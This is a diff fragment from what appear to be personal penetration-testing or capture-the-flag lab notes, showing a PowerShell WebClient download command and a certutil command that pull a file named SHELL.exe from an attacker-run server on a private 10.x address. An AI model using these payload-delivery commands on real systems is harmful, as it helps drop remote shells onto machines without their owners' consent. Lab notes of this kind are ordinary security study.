@@ -136,6 +136,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.75:800
 ![[Pasted image 20251013221421.png]]
 
 The above method was giving issues, so i tried using: Certutil
+
 ```
 certutil -urlcache -f http://10.9.0.78:8000/SHELL.exe SHELL.exe
 ```
